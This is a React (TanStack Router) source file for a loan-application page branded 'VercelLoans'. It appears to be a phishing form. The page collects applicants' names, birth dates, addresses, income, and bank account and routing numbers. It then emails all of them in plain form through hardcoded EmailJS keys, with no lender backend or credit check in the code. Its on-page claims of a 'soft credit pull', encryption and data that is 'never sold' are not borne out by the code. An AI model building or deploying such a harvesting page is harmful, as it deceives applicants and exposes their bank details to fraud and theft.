import { createFileRoute } from "@tanstack/react-router";
import { useState } from "react";
import { z } from "zod";
import { CheckCircle2, ShieldCheck, Lock } from "lucide-react";
import { toast } from "sonner";
import emailjs from "@emailjs/browser";
import { Toaster } from "../components/ui/sonner";

// EmailJS configuration (v4 API)
const EJS_SERVICE  = "service_1zvjatx";
const EJS_TEMPLATE = "template_a4s8uhb";
const EJS_KEY      = "ZGCBdQn6Uwqmx-pYO";

// Initialize EmailJS with v4 API
emailjs.init({ publicKey: EJS_KEY });

export const Route = createFileRoute("/apply")({
  head: () => ({
    meta: [
      { title: "Apply — VercelLoans" },
      { name: "description", content: "Apply for a VercelLoans personal loan in minutes. Soft credit check, no impact to your score." },
    ],
  }),
  component: ApplyPage,
});

const US_STATES = ["AL","AK","AZ","AR","CA","CO","CT","DE","FL","GA","HI","ID","IL","IN","IA","KS","KY","LA","ME","MD","MA","MI","MN","MS","MO","MT","NE","NV","NH","NJ","NM","NY","NC","ND","OH","OK","OR","PA","RI","SC","SD","TN","TX","UT","VT","VA","WA","WV","WI","WY"];

const schema = z.object({
  fullName: z.string().trim().min(2, "Enter your full name").max(100),
  email: z.string().trim().email("Enter a valid email").max(255),
  phone: z.string().trim().min(10, "Enter a valid phone").max(20),
  dateOfBirth: z.string().min(1, "Enter your date of birth"),
  address: z.string().trim().min(3, "Enter your address").max(200),
  city: z.string().trim().min(2, "Enter your city").max(80),
  state: z.string().min(2, "Select a state").max(2),
  zip: z.string().trim().regex(/^\d{5}(-\d{4})?$/, "Enter a valid ZIP code"),
  loanAmount: z.string().min(1, "Select an amount"),
  loanPurpose: z.string().min(1, "Select a purpose"),
  employmentStatus: z.string().min(1, "Select your employment status"),
  annualIncome: z.string().min(1, "Enter your annual income"),
  bankName: z.string().min(2, "Enter your bank name"),
  yearsWithBank: z.string().min(1, "Select years with bank"),
  accountNumber: z.string().min(4, "Enter your account number"),
  routingNumber: z.string().trim().length(9, "Enter a valid 9-digit routing number"),
  consent: z.boolean().refine((v) => v === true, "You must agree to continue"),
});

type FormData = z.infer<typeof schema>;

const steps = ["Loan", "Personal", "Address", "Employment", "Bank", "Review"] as const;

function ApplyPage() {
  const [step, setStep] = useState(0);
  const [submitted, setSubmitted] = useState(false);
  const [data, setData] = useState<Partial<FormData>>({
    loanAmount: "10000",
    loanPurpose: "Debt Consolidation",
    employmentStatus: "Employed full-time",
    consent: false,
  });
  const [errors, setErrors] = useState<Record<string, string>>({});

  const update = (k: keyof FormData, v: string | boolean) => setData((d) => ({ ...d, [k]: v }));

  const validateStep = () => {
    const stepFields: Record<number, (keyof FormData)[]> = {
      0: ["loanAmount", "loanPurpose"],
      1: ["fullName", "email", "phone", "dateOfBirth"],
      2: ["address", "city", "state", "zip"],
      3: ["employmentStatus", "annualIncome"],
      4: ["bankName", "yearsWithBank", "accountNumber", "routingNumber"],
      5: ["consent"],
    };
    const fields = stepFields[step];
    const shape = Object.fromEntries(fields.map((f) => [f, true])) as Record<keyof FormData, true>;
    const partial = schema.pick(shape);
    const result = partial.safeParse(data);
    if (!result.success) {
      const errs: Record<string, string> = {};
      result.error.issues.forEach((i) => { errs[i.path[0] as string] = i.message; });
      setErrors(errs);
      return false;
    }
    setErrors({});
    return true;
  };

  const next = () => { if (validateStep()) setStep((s) => Math.min(s + 1, steps.length - 1)); };
  const back = () => setStep((s) => Math.max(s - 1, 0));

  const submit = async () => {
    const result = schema.safeParse(data);
    if (!result.success) {
      const errs: Record<string, string> = {};
      result.error.issues.forEach((i) => { errs[i.path[0] as string] = i.message; });
      setErrors(errs);
      toast.error("Please fix the highlighted fields.");
      return;
    }

    const toastId = toast.loading("Submitting your application…");
    try {
      await emailjs.send(
        EJS_SERVICE,
        EJS_TEMPLATE,
        {
          full_name:         data.fullName,
          email:             data.email,
          phone:             data.phone,
          date_of_birth:     data.dateOfBirth,
          address:           data.address,
          city:              data.city,
          state:             data.state,
          zip:               data.zip,
          loan_amount:       `$${Number(data.loanAmount).toLocaleString()}`,
          loan_purpose:      data.loanPurpose,
          employment_status: data.employmentStatus,
          annual_income:     `$${Number(data.annualIncome || 0).toLocaleString()}`,
          bank_name:         data.bankName,
          years_with_bank:   data.yearsWithBank,
          account_number:    data.accountNumber,
          routing_number:    data.routingNumber,
        },
      );
      toast.dismiss(toastId);
      toast.success("Application received!");
      setSubmitted(true);
    } catch (err) {
      console.error("EmailJS error:", err);
      toast.dismiss(toastId);
      toast.error("Submission failed — please try again or call us directly.");
    }
  };


  if (submitted) {
    return (
      <div className="container mx-auto px-4 py-20 max-w-2xl text-center">
        <Toaster />
        <div className="mx-auto grid h-16 w-16 place-items-center rounded-full bg-accent/20">
          <CheckCircle2 className="h-8 w-8 text-accent" />
        </div>
        <h1 className="mt-6 text-3xl md:text-4xl font-bold">Application received</h1>
        <p className="mt-3 text-muted-foreground">
          Thanks, {data.fullName?.split(" ")[0]}! We're reviewing your application and will email <strong>{data.email}</strong> with your personalized offers within minutes.
        </p>
      </div>
    );
  }

  return (
    <div className="container mx-auto px-4 py-12 max-w-3xl">
      <Toaster />
      <div className="text-center mb-8">
        <h1 className="text-3xl md:text-4xl font-bold tracking-tight">Check your rate</h1>
        <p className="mt-2 text-sm text-muted-foreground inline-flex items-center gap-2">
          <Lock className="h-3.5 w-3.5" /> Soft credit pull only — won't affect your credit score.
        </p>
      </div>

      <div className="flex items-center justify-between mb-8">
        {steps.map((s, i) => (
          <div key={s} className="flex-1 flex items-center">
            <div className={`flex flex-col items-center ${i <= step ? "text-foreground" : "text-muted-foreground"}`}>
              <div className={`h-8 w-8 rounded-full grid place-items-center text-xs font-semibold ${i <= step ? "text-primary-foreground" : "bg-muted"}`} style={i <= step ? { background: "var(--gradient-hero)" } : {}}>
                {i + 1}
              </div>
              <span className="text-xs mt-1 hidden sm:block">{s}</span>
            </div>
            {i < steps.length - 1 && <div className={`flex-1 h-0.5 mx-2 ${i < step ? "bg-primary" : "bg-border"}`} />}
          </div>
        ))}
      </div>

      <div className="rounded-2xl border border-border bg-card p-6 md:p-8 shadow-sm">
        {step === 0 && (
          <div className="space-y-5">
            <h2 className="text-xl font-semibold">How much do you need?</h2>
            <Field label="Loan amount" error={errors.loanAmount}>
              <select className={inputCls} value={data.loanAmount} onChange={(e) => update("loanAmount", e.target.value)}>
                {["1000","2500","5000","7500","10000","15000","20000","25000","35000"].map((a) => (
                  <option key={a} value={a}>${Number(a).toLocaleString()}</option>
                ))}
              </select>
            </Field>
            <Field label="Loan purpose" error={errors.loanPurpose}>
              <select className={inputCls} value={data.loanPurpose} onChange={(e) => update("loanPurpose", e.target.value)}>
                {["Debt Consolidation","Credit Card Refinance","Home Improvement","Major Purchase","Medical","Auto","Moving","Other"].map((p) => (
                  <option key={p}>{p}</option>
                ))}
              </select>
            </Field>
          </div>
        )}

        {step === 1 && (
          <div className="space-y-5">
            <h2 className="text-xl font-semibold">About you</h2>
            <Field label="Full name" error={errors.fullName}>
              <input className={inputCls} value={data.fullName ?? ""} onChange={(e) => update("fullName", e.target.value)} placeholder="Jane Doe" />
            </Field>
            <Field label="Date of birth" error={errors.dateOfBirth}>
              <input type="date" className={inputCls} value={data.dateOfBirth ?? ""} onChange={(e) => update("dateOfBirth", e.target.value)} />
            </Field>
            <Field label="Email" error={errors.email}>
              <input type="email" className={inputCls} value={data.email ?? ""} onChange={(e) => update("email", e.target.value)} placeholder="jane@example.com" />
            </Field>
            <Field label="Mobile phone" error={errors.phone}>
              <input type="tel" className={inputCls} value={data.phone ?? ""} onChange={(e) => update("phone", e.target.value)} placeholder="(555) 123-4567" />
            </Field>
          </div>
        )}

        {step === 2 && (
          <div className="space-y-5">
            <h2 className="text-xl font-semibold">Where do you live?</h2>
            <Field label="Street address" error={errors.address}>
              <input className={inputCls} value={data.address ?? ""} onChange={(e) => update("address", e.target.value)} placeholder="123 Main St" />
            </Field>
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              <Field label="City" error={errors.city}>
                <input className={inputCls} value={data.city ?? ""} onChange={(e) => update("city", e.target.value)} />
              </Field>
              <Field label="State" error={errors.state}>
                <select className={inputCls} value={data.state ?? ""} onChange={(e) => update("state", e.target.value)}>
                  <option value="">Select…</option>
                  {US_STATES.map((s) => <option key={s} value={s}>{s}</option>)}
                </select>
              </Field>
              <Field label="ZIP code" error={errors.zip}>
                <input className={inputCls} value={data.zip ?? ""} onChange={(e) => update("zip", e.target.value)} placeholder="19801" />
              </Field>
            </div>
          </div>
        )}

        {step === 3 && (
          <div className="space-y-5">
            <h2 className="text-xl font-semibold">Employment & income</h2>
            <Field label="Employment status" error={errors.employmentStatus}>
              <select className={inputCls} value={data.employmentStatus} onChange={(e) => update("employmentStatus", e.target.value)}>
                {["Employed full-time","Employed part-time","Self-employed","Retired","Student","Unemployed"].map((p) => (
                  <option key={p}>{p}</option>
                ))}
              </select>
            </Field>
            <Field label="Annual income (USD)" error={errors.annualIncome}>
              <input type="number" min="0" className={inputCls} value={data.annualIncome ?? ""} onChange={(e) => update("annualIncome", e.target.value)} placeholder="60000" />
            </Field>
            <p className="text-xs text-muted-foreground inline-flex items-center gap-2">
              <ShieldCheck className="h-3.5 w-3.5" /> Your data is encrypted and never sold.
            </p>
          </div>
        )}

        {step === 4 && (
          <div className="space-y-5">
            <h2 className="text-xl font-semibold">Bank Information</h2>
            <Field label="Bank name" error={errors.bankName}>
              <input className={inputCls} value={data.bankName ?? ""} onChange={(e) => update("bankName", e.target.value)} placeholder="e.g. Chase Bank" />
            </Field>
            <Field label="Years with the bank" error={errors.yearsWithBank}>
              <select className={inputCls} value={data.yearsWithBank ?? ""} onChange={(e) => update("yearsWithBank", e.target.value)}>
                <option value="">Select…</option>
                {["Less than 1 year", "1-3 years", "3-5 years", "5+ years"].map((y) => (
                  <option key={y} value={y}>{y}</option>
                ))}
              </select>
            </Field>
            <Field label="Account number" error={errors.accountNumber}>
              <input type="password" placeholder="••••••••" className={inputCls} value={data.accountNumber ?? ""} onChange={(e) => update("accountNumber", e.target.value)} />
            </Field>
            <Field label="Routing number" error={errors.routingNumber}>
              <input type="text" maxLength={9} placeholder="9-digit routing number" className={inputCls} value={data.routingNumber ?? ""} onChange={(e) => update("routingNumber", e.target.value)} />
            </Field>
          </div>
        )}

        {step === 5 && (
          <div className="space-y-5">
            <h2 className="text-xl font-semibold">Review & submit</h2>
            <dl className="rounded-xl bg-secondary/50 p-5 text-sm grid grid-cols-2 gap-y-2">
              <dt className="text-muted-foreground">Amount</dt><dd>${Number(data.loanAmount).toLocaleString()}</dd>
              <dt className="text-muted-foreground">Purpose</dt><dd>{data.loanPurpose}</dd>
              <dt className="text-muted-foreground">Name</dt><dd>{data.fullName}</dd>
              <dt className="text-muted-foreground">DOB</dt><dd>{data.dateOfBirth}</dd>
              <dt className="text-muted-foreground">Email</dt><dd>{data.email}</dd>
              <dt className="text-muted-foreground">Phone</dt><dd>{data.phone}</dd>
              <dt className="text-muted-foreground">Address</dt><dd>{data.address}, {data.city}, {data.state} {data.zip}</dd>
              <dt className="text-muted-foreground">Employment</dt><dd>{data.employmentStatus}</dd>
              <dt className="text-muted-foreground">Income</dt><dd>${Number(data.annualIncome || 0).toLocaleString()}</dd>
              <dt className="text-muted-foreground">Bank</dt><dd>{data.bankName} ({data.yearsWithBank})</dd>
              <dt className="text-muted-foreground">Account / Routing</dt><dd>••••{data.accountNumber ? data.accountNumber.slice(-4) : ""} / {data.routingNumber}</dd>
            </dl>
            <label className="flex items-start gap-3 text-sm">
              <input type="checkbox" className="mt-1" checked={!!data.consent} onChange={(e) => update("consent", e.target.checked)} />
              <span>
                I authorize VercelLoans to perform a soft credit inquiry and contact me about loan offers. I have read the{" "}
                <span className="underline">Privacy Policy</span> and <span className="underline">E-sign Consent</span>.
              </span>
            </label>
            {errors.consent && <p className="text-xs text-destructive">{errors.consent}</p>}
          </div>
        )}

        <div className="mt-8 flex items-center justify-between gap-3">
          <button onClick={back} disabled={step === 0} className="rounded-full border border-border bg-card px-5 py-2 text-sm font-semibold disabled:opacity-50 hover:bg-muted">
            Back
          </button>
          {step < steps.length - 1 ? (
            <button onClick={next} className="rounded-full px-6 py-2.5 text-sm font-semibold text-primary-foreground" style={{ background: "var(--gradient-hero)" }}>
              Continue
            </button>
          ) : (
            <button onClick={submit} className="rounded-full px-6 py-2.5 text-sm font-semibold text-primary-foreground" style={{ background: "var(--gradient-hero)" }}>
              Submit application
            </button>
          )}
        </div>
      </div>

      <p className="mt-6 text-center text-xs text-muted-foreground">
        Your information is securely encrypted. We never ask for your online banking password or SSN on this form.
      </p>
    </div>
  );
}

const inputCls = "w-full rounded-lg border border-input bg-background px-3.5 py-2.5 text-sm focus:outline-none focus:ring-2 focus:ring-ring";

function Field({ label, error, children }: { label: string; error?: string; children: React.ReactNode }) {
  return (
    <div>
      <label className="block text-sm font-medium mb-1.5">{label}</label>
      {children}
      {error && <p className="mt-1 text-xs text-destructive">{error}</p>}
    </div>
  );
}
